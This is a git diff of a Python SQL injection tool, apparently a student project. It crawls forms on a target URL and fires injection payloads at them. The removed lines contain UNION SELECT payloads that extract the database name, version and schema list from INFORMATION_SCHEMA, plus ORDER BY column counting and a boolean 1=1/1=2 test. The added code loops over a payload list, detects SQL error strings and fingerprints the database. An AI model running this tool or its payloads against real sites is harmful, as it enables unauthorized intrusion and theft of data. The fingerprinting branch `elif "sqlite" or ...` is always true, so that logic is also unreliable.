@@ -3,8 +3,13 @@
 import requests
 import argparse
 import json
+import sys
 from urllib.parse import urlparse, urljoin
 from bs4 import BeautifulSoup
+from payloads import payloadsList
+
+database = 'Not found'
+database_found = 'False'
 
 def is_valid_url(url):
     parsed = urlparse(url)
@@ -15,27 +20,42 @@ def get_forms(url):
     soup = BeautifulSoup(response.content, "html.parser")
     return soup.find_all("form")
 
-def get_number_of_columns(url, form_details, method="POST"):
-    for i in range(1, 21):  # Limite à 20 colonnes pour l'exemple
-        payload = f"' ORDER BY {i}-- "
-        response = submit_form(form_details, url, payload, method)
-        if "Unknown column" in response.text or "different number of columns" in response.text:
-            return i - 1
-    return None
+def ft_check_vulnerable(response, result):
+    errors = {
+        # MySQL
+        "you have an error in your sql syntax;",
+        "warning: mysql",
+        # SQLite
+        ": syntax error",
+        "unrecognized token"
+    }
+    for error in errors:
+        # if you find one of these errors, return True
+        if error in response.content.decode().lower():
+            if database_found == 'False':
+                resultCheckDb = ft_check_db(response)
+                result.update(resultCheckDb)
+            return True
+    # no error detected
+    return False
 
-# def get_form_details(form):
-#     details = {}
-#     action = form.attrs.get("action").lower()
-#     method = form.attrs.get("method", "get").lower()
-#     inputs = []
-#     for input_tag in form.find_all("input"):
-#         input_type = input_tag.attrs.get("type", "text")
-#         input_name = input_tag.attrs.get("name")
-#         inputs.append({"type": input_type, "name": input_name})
-#     details["action"] = action
-#     details["method"] = method
-#     details["inputs"] = inputs
-#     return details
+def ft_check_db(response):
+    result = {}
+    global database, database_found
+    if database_found == 'False':
+        if "mariadb" in response.content.decode().lower():
+            database = "MariaDB"
+        elif "mysql" in response.content.decode().lower():
+            database = "MySQL"
+        elif "sqlite" or ": syntax error" or "unrecognized token" in response.content.decode().lower():
+            database = "SQLite"
+        elif "microsoft sql server" in response.content.decode().lower():
+            database = "SQL Server"
+        if database != 'Not found':
+            database_found = "True"
+        if database_found == 'True':
+            result["databases"] = database
+    return result
 
 def get_form_details(form):
     details = {}
@@ -55,7 +75,6 @@ def get_form_details(form):
     details["inputs"] = inputs
     return details
 
-
 def submit_form(form_details, url, payload, method):
     target_url = urljoin(url, form_details["action"])
     data = {}
@@ -69,49 +88,27 @@ def submit_form(form_details, url, payload, method):
     else:
         return requests.get(target_url, params=data)
 
-
-def union_based_sql_injection(url, form_details, num_columns, method="POST"):
-    results = {}
-    
-    # Tentative de récupération du nom de la base de données
-    db_payload = f"' UNION SELECT database(), {', '.join(['NULL'] * (num_columns - 1))}-- "
-    db_response = submit_form(form_details, url, db_payload, method)
-    if "database()" in db_response.text.lower():
-        soup = BeautifulSoup(db_response.content, 'html.parser')
-        tables = [td.text for td in soup.find_all("td")]
-        if tables:
-            results["database_name"] = tables[0]
-
-    # Tentative de récupération de la version de la base de données
-    version_payload = f"' UNION SELECT version(), {', '.join(['NULL'] * (num_columns - 1))}-- "
-    version_response = submit_form(form_details, url, version_payload, method)
-    if "version()" in version_response.text.lower():
-        soup = BeautifulSoup(version_response.content, 'html.parser')
-        versions = [td.text for td in soup.find_all("td")]
-        if versions:
-            results["database_version"] = versions[0]
-
-    # Tentative de récupération des bases de données disponibles
-    dbs_payload = f"' UNION SELECT schema_name, {', '.join(['NULL'] * (num_columns - 1))} FROM INFORMATION_SCHEMA.SCHEMATA-- "
-    dbs_response = submit_form(form_details, url, dbs_payload, method)
-    if "schema_name" in dbs_response.text.lower():
-        soup = BeautifulSoup(dbs_response.content, 'html.parser')
-        databases = [td.text for td in soup.find_all("td")]
-        if databases:
-            results["databases"] = databases
-
-    return results
-
-def boolean_based_sql_injection(url, form_details, method="POST"):
-    true_payload = "' AND 1=1--"
-    false_payload = "' AND 1=2--"
-    
-    true_response = submit_form(form_details, url, true_payload, method)
-    false_response = submit_form(form_details, url, false_payload, method)
-    
-    if true_response.text != false_response.text:
-        return True
-    return False
+def ft_injection_sql(url, method, form):
+    result = {
+        "payloads": []
+    }
+    for p_type in payloadsList:
+        for i in payloadsList[p_type]:
+            form_details = get_form_details(form)
+            response = submit_form(form_details, url, i, method)
+            vulnerabilities = ft_check_vulnerable(response, result)
+            if not vulnerabilities:
+                vulnerabilite_indicator = [
+                    "another", "table", "information_schema.tables", "information_schema.columns",
+                    "version()", "database()", "user()", "@@version", "group_concat", "table_schema", "ID"
+                ]
+                for indicator in vulnerabilite_indicator:
+                    if indicator.lower() in response.content.decode().lower():
+                        result["payloads"].append({
+                            "payload": i,
+                            "response": response.text
+                        })
+    return result
 
 def detect_sql_injection(url, payloads, method):
     forms = get_forms(url)
@@ -126,28 +123,20 @@ def detect_sql_injection(url, payloads, method):
 
     for form in forms:
         form_details = get_form_details(form)
-        num_columns = get_number_of_columns(url, form_details, method)
-        print(num_columns)
         for payload in payloads:
             method = method.upper()  # Convertit la méthode en majuscules
             response = submit_form(form_details, url, payload, method)
-            if "sql" in response.text.lower() or "syntax" in response.text.lower():
+            vulnerabilities = ft_check_vulnerable(response, results)
+            print(payload)
+            if vulnerabilities:
                 results["vulnerable"] = True
                 results["payloads"].append({
                     "payload": payload,
                     "response": response.text
                 })
-                if num_columns and num_columns > 0:
-                    union_results = union_based_sql_injection(url, form_details, num_columns, method)
-                    results.update(union_results)
-
-                if boolean_based_sql_injection(url, form_details, method):
-                    results["vulnerable"] = True
-                    results["payloads"].append({
-                        "type": "boolean",
-                        "payload": "1=1 vs 1=2"
-                    })
-                break
+                resultsqlinjection = ft_injection_sql(url, method, form)
+                if "payloads" in results and "payloads" in resultsqlinjection:
+                    results["payloads"].extend(resultsqlinjection["payloads"])
         if results["vulnerable"]:
             break
 
@@ -162,7 +151,6 @@ def main():
     parser.add_argument('url', type=str, help='URL to test')
     parser.add_argument('-o', type=str, default='default_archive.json', help='Output file (default: default_archive.json)')
     parser.add_argument('-X', type=str, default='GET', choices=['GET', 'POST'], help='HTTP method to use (default: GET)')
-
 
     args = parser.parse_args()
 
